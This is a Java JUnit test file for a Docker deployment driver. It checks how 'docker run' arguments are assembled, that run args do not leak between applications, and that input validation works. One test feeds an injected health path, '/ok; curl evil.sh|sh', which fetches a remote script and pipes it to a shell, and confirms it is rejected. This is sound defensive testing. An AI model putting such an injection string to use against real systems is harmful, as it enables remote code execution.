package eu.wohlben.qits.cd.dockerhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.cd.control.DeploymentDriver;
import eu.wohlben.qits.cd.error.BadRequestException;
import io.smallrye.config.EnvConfigSource;
import io.smallrye.config.PropertiesConfigSource;
import io.smallrye.config.SmallRyeConfigBuilder;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * The {@code docker run} argv as assembled — plain JUnit over the package-private builder, the
 * {@code CiDaemonLauncherTest} stance: the argv IS the contract with the docker CLI, and asserting
 * it needs no docker.
 */
class DockerDeploymentDriverTest {

  private DockerDeploymentDriver driver() {
    return driver(Map.of());
  }

  private DockerDeploymentDriver driver(Map<String, String> properties) {
    DockerDeploymentDriver driver = new DockerDeploymentDriver();
    driver.runtime = "docker";
    driver.pullTimeoutSeconds = 600;
    driver.healthIntervalSeconds = 3;
    driver.healthRetries = 3;
    driver.healthStartPeriodSeconds = 10;
    driver.outputMaxChars = 65536;
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(new PropertiesConfigSource(properties, "test", 100))
            .build();
    return driver;
  }

  private DeploymentDriver.StartSpec spec(String healthPath) {
    return new DeploymentDriver.StartSpec(
        "env-id",
        "some-epic",
        "app-id",
        "qits-gateway",
        "dep-id",
        "qits-env-some-epic",
        "qits-artifacts:8080/qits/qits-gateway:abc1234",
        "qits-cd-some-epic-qits-gateway-dep",
        healthPath);
  }

  @Test
  void theArgvCarriesNetworkAliasLabelsHealthGateAndRestartPolicy() {
    List<String> argv = driver().buildArgv(spec("/q/health/ready"));

    assertEquals(List.of("docker", "run", "-d"), argv.subList(0, 3));
    assertTrue(argv.containsAll(List.of("--network", "qits-env-some-epic")));
    assertTrue(argv.containsAll(List.of("--network-alias", "qits-gateway")));
    assertTrue(argv.containsAll(List.of("--restart", "unless-stopped")));
    assertTrue(argv.contains("qits.cd.environment=env-id"));
    assertTrue(argv.contains("qits.cd.application=app-id"));
    assertTrue(argv.contains("qits.cd.deployment=dep-id"));
    assertTrue(argv.contains("curl -fsS http://localhost:8080/q/health/ready || exit 1"));
    assertTrue(argv.containsAll(List.of("--health-interval", "3s")));
    assertTrue(argv.containsAll(List.of("--health-retries", "3")));
    assertTrue(argv.containsAll(List.of("--health-start-period", "10s")));
    assertTrue(argv.contains("QITS_ENVIRONMENT=some-epic"));
    assertTrue(argv.contains("QITS_APPLICATION=qits-gateway"));
    // The image is the last token: the entrypoint is the image's own, with no command appended.
    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
  }

  @Test
  void runArgsAreAppendedBetweenCdsOwnFlagsAndTheImage() {
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-gateway",
                "-v qits-data:/data --env FOO=bar"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of(
            "-v",
            "qits-data:/data",
            "--env",
            "FOO=bar",
            "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 5, argv.size()));
  }

  @Test
  void runArgsOfAnotherApplicationDoNotLeakIn() {
    // The absence is the assertion that matters: only the deployed application's own key reaches
    // its argv, so one application's socket mount cannot ride along on a sibling's deployment.
    DockerDeploymentDriver driver =
        driver(
            Map.of(
                DockerDeploymentDriver.RUN_ARGS_PREFIX + "qits-workspaces",
                "-v /var/run/docker.sock:/var/run/docker.sock"));

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals("qits-artifacts:8080/qits/qits-gateway:abc1234", argv.get(argv.size() - 1));
    assertTrue(argv.stream().noneMatch(a -> a.contains("docker.sock")));
  }

  @Test
  void runArgsResolveFromTheEnvSpelling() {
    // The deployment sets QITS_CD_RUN_ARGS_QITS_GATEWAY in compose; this pins that SmallRye's
    // env mapping really answers the dashed property name the driver asks for.
    DockerDeploymentDriver driver = driver();
    driver.config =
        new SmallRyeConfigBuilder()
            .withSources(
                new EnvConfigSource(Map.of("QITS_CD_RUN_ARGS_QITS_GATEWAY", "--env FOO=bar"), 300))
            .build();

    List<String> argv = driver.buildArgv(spec("/q/health/ready"));

    assertEquals(
        List.of("--env", "FOO=bar", "qits-artifacts:8080/qits/qits-gateway:abc1234"),
        argv.subList(argv.size() - 3, argv.size()));
  }

  @Test
  void aHostileHealthPathCannotReachTheShellString() {
    // Belt on top of the boundary's braces: the one value interpolated into a string a shell will
    // run is re-validated at the last line before the argv.
    assertThrows(
        BadRequestException.class, () -> driver().buildArgv(spec("/ok; curl evil.sh|sh")));
  }
}
